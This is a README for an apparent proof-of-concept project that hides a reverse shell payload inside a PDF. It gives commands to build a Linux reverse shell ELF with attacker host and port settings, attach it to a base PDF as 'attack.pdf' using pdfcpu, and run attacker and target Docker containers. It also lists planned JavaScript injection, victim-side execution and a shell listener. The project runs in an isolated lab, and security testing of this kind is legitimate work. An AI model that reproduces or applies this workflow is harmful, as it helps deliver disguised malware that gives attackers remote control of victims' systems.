# Reverse Shell + Stego-in-PDF + JavaScript PoC

## Overview
This project demonstrates an end-to-end proof-of-concept (PoC) for embedding a reverse shell payload inside a PDF using steganography and JavaScript. The workflow is modular and focuses on Linux for the initial implementation.

## Project Structure
```
reverse-stego-poc/
├── docker/                # Dockerfiles and compose for attacker/target
├── payloads/              # Generated payloads (e.g., shell.elf)
├── pdfs/                  # PDF carrier, embedding, and JS injection scripts
├── scripts/               # Build, listener, and simulation scripts
├── server/                # Optional HTTP server for payload delivery
├── output/                # Artifacts, logs, extracted files
├── docs/                  # Documentation and plans
├── README.md
└── requirements.txt
```

## Quickstart

### 1. Build and Start Docker Environment
```bash
cd docker
# Build and start both attacker and target containers
sudo docker compose -f compose.yml up --build
```
- This will start two containers: `attacker` and `target`, networked for reverse shell testing.

### 2. Generate a Linux Reverse Shell Payload
```bash
# From the project root or inside the attacker container:
LHOST=<attacker_ip> LPORT=4444 ./scripts/build_payload.sh
# Output: payloads/shell.elf
```

### 3. Attach Payload to PDF using Dockerized pdfcpu
```bash
# Make sure you have a base PDF at pdfs/base.pdf
# Attach the payload using the helper script:
# ./scripts/pdfcpu_attach.sh pdfs/base.pdf payloads/shell.elf pdfs/attack.pdf
./scripts/pdfcpu_attach.sh ./pdfs/new_base.pdf ./payloads/shell.elf ./pdfs/attack.pdf 
# Output: pdfs/attack.pdf (with payload attached)
```
- This uses the official pdfcpu Docker image ([repo](https://github.com/pdfcpu/pdfcpu)).

### 4. Next Steps
- Inject JavaScript if desired
- Simulate victim-side extraction and execution
- Listen for the reverse shell connection

## Requirements
- Python 3.10+
- Docker (for isolated testing)
- See requirements.txt for Python dependencies

## Status
- [x] Project structure and Docker environment
- [x] Payload generation script
- [x] PDF embedding (Dockerized pdfcpu)
- [ ] JS injection and end-to-end PoC
